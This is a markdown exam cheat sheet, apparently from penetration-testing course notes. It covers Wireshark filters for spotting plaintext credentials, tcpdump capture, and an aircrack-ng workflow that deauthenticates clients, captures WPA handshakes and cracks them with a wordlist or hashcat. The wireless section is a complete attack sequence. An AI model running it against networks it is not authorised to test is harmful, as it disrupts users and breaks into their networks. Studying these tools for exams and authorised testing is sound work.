# 4. Network Traffic Analysis & Wireless Access Exploitation

## Wireshark (GUI) — display filters (lowercase protocol names)
```
ip.addr == 192.168.1.10        # traffic to/from host
ip.src == x.x.x.x
http                          # only HTTP
http.request.method == "POST"  # logins/creds
http.request.uri contains "login"
ftp || ftp-data                # FTP = plaintext credentials!
telnet                         # also plaintext
tcp.flags.syn == 1 && tcp.flags.ack == 0    # SYN scan signature
icmp                           # ping sweeps
dns                            # DNS queries/leak
wlan                           # wireless frames
eapol                          # WPA 4-way handshake frames
tcp.stream eq 3                # follow specific stream
```
- **Follow TCP Stream:** right-click a packet → Follow → TCP Stream (see full conversation in plaintext).
- **Export objects:** File → Export Objects → HTTP (pull files out of capture).
- Capture filters (BPF, when starting capture) differ from display filters: `tcp port 80`, `host 192.168.1.5`, `not broadcast and not arp`.

## tcpdump (CLI)
```bash
tcpdump -i eth0 -n                      # no DNS resolution (-n)
tcpdump -i eth0 port 80
tcpdump -i eth0 host 10.0.0.5 -w out.pcap
tcpdump -r capture.pcap -nn             # read a file
tcpdump -i eth0 -A                      # ASCII payload
tcpdump port 53                         # DNS
```

## Wireless exploitation — aircrack-ng suite
```bash
# 0. Enable monitor mode
airmon-ng check kill                    # stop interfering processes
airmon-ng start wlan0                   # creates wlan0mon (or wlan0 in mon mode on newer Kali)

# 1. Scan for targets
airodump-ng wlan0mon                    # shows BSSIDs, channel, encryption, clients
airodump-ng wlan0mon --bssid XX:XX:XX:XX:XX:XX -c 6 -w capture   # lock onto one AP (-c channel)

# 2. Capture the WPA 4-way handshake
#    (wait for a client to (re)connect, or force it:)
aireplay-ng --deauth 10 -a <AP MAC> -c <CLIENT MAC> wlan0mon

# 3. Crack the handshake with a wordlist
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
# or hashcat:
#  hcxtools: hcxpcapngtool -o hash.txt capture.cap
#  hashcat -m 22000 hash.txt rockyou.txt
```
Other tools: `wifite` (automates the whole suite: `sudo wifite`), `fern-wifi-cracker` (GUI).

## Exam key facts
- Handshake = 4 EAPOL packets; you need messages 1–2 or 2–3 (a full or partial pair) to crack.
- You need **monitor mode** before anything else; managed mode can't capture handshakes.
- WEP is crackable quickly (IV collection with `aireplay-ng --arpreplay`); WPA/WPA2 requires a handshake + wordlist; WPA2-PSK only, enterprise (WPA2-EAP) not crackable this way.
- `aircrack-ng` alone doesn't capture — the suite is: airmon-ng (monitor), airodump-ng (capture), aireplay-ng (inject/deauth), aircrack-ng (crack).

← [Back to index](README.md)
